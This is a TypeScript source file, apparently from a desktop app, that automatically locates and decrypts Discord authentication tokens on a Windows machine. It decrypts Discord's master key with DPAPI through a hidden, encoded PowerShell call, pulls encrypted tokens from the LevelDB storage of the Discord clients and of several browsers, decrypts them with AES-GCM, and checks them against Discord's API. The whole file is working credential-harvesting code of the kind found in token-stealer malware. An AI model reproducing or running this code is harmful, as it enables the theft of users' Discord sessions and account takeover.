// ============================================================
// Token Detector — Finds and decrypts Discord tokens from
// the local Discord desktop app's encrypted LevelDB storage.
//
// Flow:
// 1. Read encrypted master key from %APPDATA%/discord/Local State
// 2. Decrypt master key using Windows DPAPI (via PowerShell)
// 3. Find encrypted tokens in LevelDB (dQw4w9WgXcQ: prefix)
// 4. Decrypt tokens using AES-256-GCM with the master key
// 5. Validate tokens against Discord API
// ============================================================

import path from 'path'
import fs from 'fs'
import os from 'os'
import crypto from 'crypto'
import { execSync } from 'child_process'

interface TokenCandidate {
  source: string
  token: string
  path: string
}

// Discord variants on Windows
const DISCORD_APPS: { name: string; folder: string }[] = [
  { name: 'Discord', folder: 'discord' },
  { name: 'Discord PTB', folder: 'discordptb' },
  { name: 'Discord Canary', folder: 'discordcanary' },
  { name: 'Discord Development', folder: 'discorddevelopment' }
]

export class TokenDetector {

  /**
   * Full auto-detect: find tokens + validate them.
   */
  static async detectAndValidate(): Promise<{
    candidates: TokenCandidate[]
    valid: { source: string; token: string; user: any }[]
  }> {
    console.log('[TokenDetector] Starting detection...')
    const candidates = await TokenDetector.detectAll()
    console.log(`[TokenDetector] Found ${candidates.length} candidate(s)`)

    const valid: { source: string; token: string; user: any }[] = []

    for (const candidate of candidates) {
      console.log(`[TokenDetector] Validating token from ${candidate.source}...`)
      const result = await TokenDetector.validateToken(candidate.token)
      if (result.valid && result.user) {
        if (!valid.find(v => v.user.id === result.user.id)) {
          valid.push({
            source: candidate.source,
            token: candidate.token,
            user: result.user
          })
          console.log(`[TokenDetector] ✅ Valid token from ${candidate.source}: ${result.user.username}`)
        }
      } else {
        console.log(`[TokenDetector] ❌ Invalid token from ${candidate.source}`)
      }
    }

    console.log(`[TokenDetector] Done. ${valid.length} valid token(s) found.`)
    return { candidates, valid }
  }

  /**
   * Scan all Discord installations for tokens.
   */
  static async detectAll(): Promise<TokenCandidate[]> {
    const candidates: TokenCandidate[] = []
    const appData = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming')

    for (const app of DISCORD_APPS) {
      const basePath = path.join(appData, app.folder)
      if (!fs.existsSync(basePath)) {
        console.log(`[TokenDetector] ${app.name}: Not installed at ${basePath}`)
        continue
      }

      console.log(`[TokenDetector] ${app.name}: Found at ${basePath}`)

      try {
        // Step 1: Get master key from Local State
        const masterKey = TokenDetector.getMasterKey(basePath)
        if (!masterKey) {
          console.log(`[TokenDetector] ${app.name}: No master key found, trying unencrypted fallback`)
          // Try unencrypted tokens as fallback
          const unencrypted = TokenDetector.scanForUnencryptedTokens(basePath)
          candidates.push(...unencrypted.map(t => ({ source: app.name, token: t, path: basePath })))
          continue
        }

        console.log(`[TokenDetector] ${app.name}: Master key decrypted (${masterKey.length} bytes)`)

        // Step 2: Find encrypted tokens in LevelDB
        const leveldbPath = path.join(basePath, 'Local Storage', 'leveldb')
        if (!fs.existsSync(leveldbPath)) {
          console.log(`[TokenDetector] ${app.name}: No LevelDB directory`)
          continue
        }

        const encryptedTokens = TokenDetector.findEncryptedTokens(leveldbPath)
        console.log(`[TokenDetector] ${app.name}: Found ${encryptedTokens.length} encrypted token(s)`)

        // Step 3: Decrypt each token
        for (const encToken of encryptedTokens) {
          try {
            const decrypted = TokenDetector.decryptValue(masterKey, encToken)
            if (decrypted && decrypted.length > 50) {
              if (!candidates.find(c => c.token === decrypted)) {
                candidates.push({
                  source: app.name,
                  token: decrypted,
                  path: leveldbPath
                })
              }
            }
          } catch (err) {
            console.error(`[TokenDetector] ${app.name}: Decrypt error -`, err)
          }
        }
      } catch (error) {
        console.error(`[TokenDetector] ${app.name}: Error -`, error)
      }
    }

    // Also try browser profiles
    const browserTokens = await TokenDetector.scanBrowserProfiles()
    for (const bt of browserTokens) {
      if (!candidates.find(c => c.token === bt.token)) {
        candidates.push(bt)
      }
    }

    return candidates
  }

  // ===== Step 1: Get Master Key =====

  /**
   * Read and decrypt the master encryption key from Discord's Local State file.
   * The key is DPAPI-encrypted and base64-encoded.
   */
  private static getMasterKey(discordBasePath: string): Buffer | null {
    const localStatePath = path.join(discordBasePath, 'Local State')
    if (!fs.existsSync(localStatePath)) {
      console.log(`[TokenDetector] No Local State at ${localStatePath}`)
      return null
    }

    try {
      const data = JSON.parse(fs.readFileSync(localStatePath, 'utf-8'))
      const encryptedKeyB64 = data?.os_crypt?.encrypted_key
      if (!encryptedKeyB64) {
        console.log('[TokenDetector] No os_crypt.encrypted_key in Local State')
        return null
      }

      // Base64 decode → remove 'DPAPI' prefix (first 5 bytes)
      const encryptedKey = Buffer.from(encryptedKeyB64, 'base64')
      const dpapiPrefix = encryptedKey.subarray(0, 5).toString('utf-8')
      if (dpapiPrefix !== 'DPAPI') {
        console.log(`[TokenDetector] Unexpected key prefix: "${dpapiPrefix}"`)
        return null
      }

      const dpapiEncryptedKey = encryptedKey.subarray(5)

      // Decrypt with Windows DPAPI via PowerShell
      const decryptedKey = TokenDetector.dpapiDecrypt(dpapiEncryptedKey)
      return decryptedKey
    } catch (error) {
      console.error('[TokenDetector] Failed to get master key:', error)
      return null
    }
  }

  /**
   * Decrypt a DPAPI-encrypted buffer using PowerShell.
   * Uses -EncodedCommand to avoid shell escaping issues.
   */
  private static dpapiDecrypt(encryptedData: Buffer): Buffer | null {
    try {
      const b64 = encryptedData.toString('base64')

      // Build the PowerShell script as a proper multi-line string
      const psScript = [
        'Add-Type -AssemblyName System.Security',
        `$encrypted = [Convert]::FromBase64String('${b64}')`,
        '$decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)',
        '[Convert]::ToBase64String($decrypted)'
      ].join('\n')

      // Encode the script as UTF-16LE base64 for -EncodedCommand
      const encodedCommand = Buffer.from(psScript, 'utf16le').toString('base64')

      const result = execSync(
        `powershell -NoProfile -NonInteractive -EncodedCommand ${encodedCommand}`,
        {
          encoding: 'utf-8',
          timeout: 15000,
          windowsHide: true,
          stdio: ['pipe', 'pipe', 'pipe']
        }
      ).trim()

      if (result) {
        const decoded = Buffer.from(result, 'base64')
        console.log(`[TokenDetector] DPAPI decrypted key: ${decoded.length} bytes`)
        return decoded
      }
      return null
    } catch (error) {
      console.error('[TokenDetector] DPAPI decrypt failed:', error)
      return null
    }
  }

  // ===== Step 2: Find Encrypted Tokens =====

  /**
   * Scan LevelDB files for encrypted token values.
   * Encrypted tokens are prefixed with "dQw4w9WgXcQ:" in the LevelDB data.
   */
  private static findEncryptedTokens(leveldbPath: string): Buffer[] {
    const tokens: Buffer[] = []

    try {
      const files = fs.readdirSync(leveldbPath)
      const targetFiles = files.filter(f =>
        f.endsWith('.ldb') || f.endsWith('.log') || f.endsWith('.sst')
      )

      for (const file of targetFiles) {
        const filePath = path.join(leveldbPath, file)
        try {
          // Read as binary
          const content = fs.readFileSync(filePath)
          const contentStr = content.toString('latin1')

          // Search for the dQw4w9WgXcQ: pattern (encrypted token marker)
          const marker = 'dQw4w9WgXcQ:'
          let searchStart = 0

          while (true) {
            const idx = contentStr.indexOf(marker, searchStart)
            if (idx === -1) break

            // Extract the base64-encoded encrypted token after the marker
            const afterMarker = contentStr.substring(idx + marker.length)

            // The base64 value continues until a non-base64 character
            // Base64 chars: A-Z, a-z, 0-9, +, /, =
            const b64Match = afterMarker.match(/^[A-Za-z0-9+/=]+/)
            if (b64Match && b64Match[0].length > 20) {
              try {
                const encryptedToken = Buffer.from(b64Match[0], 'base64')
                if (encryptedToken.length > 20) {
                  tokens.push(encryptedToken)
                }
              } catch {
                // Invalid base64
              }
            }

            searchStart = idx + marker.length + 10
          }
        } catch {
          // Skip unreadable files
        }
      }
    } catch (error) {
      console.error(`[TokenDetector] Error scanning ${leveldbPath}:`, error)
    }

    // Deduplicate by content
    const unique: Buffer[] = []
    const seen = new Set<string>()
    for (const t of tokens) {
      const key = t.toString('base64')
      if (!seen.has(key)) {
        seen.add(key)
        unique.push(t)
      }
    }

    return unique
  }

  // ===== Step 3: Decrypt Token =====

  /**
   * Decrypt an encrypted token using AES-256-GCM.
   *
   * Encrypted token format:
   * - Bytes 0-2: version prefix ("v10" or "v11")
   * - Bytes 3-14: 12-byte IV/nonce
   * - Bytes 15...(n-16): ciphertext
   * - Last 16 bytes: GCM auth tag
   */
  private static decryptValue(masterKey: Buffer, encryptedValue: Buffer): string | null {
    try {
      // Check version prefix
      const version = encryptedValue.subarray(0, 3).toString('utf-8')
      if (version !== 'v10' && version !== 'v11') {
        console.log(`[TokenDetector] Unknown encryption version: "${version}"`)
        return null
      }

      // Extract components
      const iv = encryptedValue.subarray(3, 15)          // 12 bytes
      const ciphertext = encryptedValue.subarray(15, encryptedValue.length - 16)
      const authTag = encryptedValue.subarray(encryptedValue.length - 16)

      if (ciphertext.length < 1 || iv.length !== 12 || authTag.length !== 16) {
        return null
      }

      // Decrypt with AES-256-GCM
      const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv)
      decipher.setAuthTag(authTag)
      const decrypted = Buffer.concat([
        decipher.update(ciphertext),
        decipher.final()
      ])

      const token = decrypted.toString('utf-8')

      // Sanity check: tokens should look like a string
      if (token.length > 20 && /^[\x20-\x7E]+$/.test(token)) {
        return token
      }

      return null
    } catch (error) {
      // Decryption failed — wrong key or corrupted data
      return null
    }
  }

  // ===== Fallback: Unencrypted Tokens =====

  /**
   * Scan for old-style unencrypted tokens (pre-2024 Discord or some edge cases).
   */
  private static scanForUnencryptedTokens(basePath: string): string[] {
    const tokens: string[] = []
    const leveldbPath = path.join(basePath, 'Local Storage', 'leveldb')
    if (!fs.existsSync(leveldbPath)) return tokens

    const tokenPatterns = [
      /[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g,
      /mfa\.[\w-]{84,}/g
    ]

    try {
      const files = fs.readdirSync(leveldbPath).filter(f =>
        f.endsWith('.ldb') || f.endsWith('.log')
      )

      for (const file of files) {
        try {
          const content = fs.readFileSync(path.join(leveldbPath, file), 'latin1')
          for (const pattern of tokenPatterns) {
            const regex = new RegExp(pattern.source, pattern.flags)
            let match = regex.exec(content)
            while (match) {
              const t = match[0]
              if (t.length >= 50 && !tokens.includes(t)) {
                tokens.push(t)
              }
              match = regex.exec(content)
            }
          }
        } catch { /* skip */ }
      }
    } catch { /* skip */ }

    return tokens
  }

  // ===== Browser Profiles =====

  /**
   * Scan browser profiles that might have Discord web tokens.
   */
  private static async scanBrowserProfiles(): Promise<TokenCandidate[]> {
    const candidates: TokenCandidate[] = []
    const localAppData = process.env.LOCALAPPDATA || path.join(os.homedir(), 'AppData', 'Local')
    const appData = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming')

    const browsers: { name: string; basePath: string }[] = [
      { name: 'Chrome', basePath: path.join(localAppData, 'Google', 'Chrome', 'User Data') },
      { name: 'Edge', basePath: path.join(localAppData, 'Microsoft', 'Edge', 'User Data') },
      { name: 'Brave', basePath: path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data') },
      { name: 'Opera', basePath: path.join(appData, 'Opera Software', 'Opera Stable') },
      { name: 'Opera GX', basePath: path.join(appData, 'Opera Software', 'Opera GX Stable') }
    ]

    for (const browser of browsers) {
      if (!fs.existsSync(browser.basePath)) continue

      try {
        const masterKey = TokenDetector.getMasterKey(browser.basePath)
        if (!masterKey) continue

        // Check Default and Profile N directories
        const profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3']
        for (const profile of profiles) {
          let leveldbPath: string
          if (browser.name === 'Opera' || browser.name === 'Opera GX') {
            leveldbPath = path.join(browser.basePath, 'Local Storage', 'leveldb')
          } else {
            leveldbPath = path.join(browser.basePath, profile, 'Local Storage', 'leveldb')
          }

          if (!fs.existsSync(leveldbPath)) continue

          const encryptedTokens = TokenDetector.findEncryptedTokens(leveldbPath)
          for (const encToken of encryptedTokens) {
            try {
              const decrypted = TokenDetector.decryptValue(masterKey, encToken)
              if (decrypted && decrypted.length > 50) {
                if (!candidates.find(c => c.token === decrypted)) {
                  candidates.push({
                    source: `${browser.name} (${profile})`,
                    token: decrypted,
                    path: leveldbPath
                  })
                }
              }
            } catch { /* skip */ }
          }

          // Only check first matching profile for Opera
          if (browser.name === 'Opera' || browser.name === 'Opera GX') break
        }
      } catch {
        // Skip inaccessible browsers
      }
    }

    return candidates
  }

  // ===== Validation =====

  /**
   * Validate a token against the Discord API.
   */
  static async validateToken(token: string): Promise<{ valid: boolean; user?: any }> {
    try {
      const response = await fetch('https://discord.com/api/v10/users/@me', {
        headers: {
          'Authorization': token,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      })

      if (response.ok) {
        const user = await response.json()
        return { valid: true, user }
      }
      return { valid: false }
    } catch {
      return { valid: false }
    }
  }
}
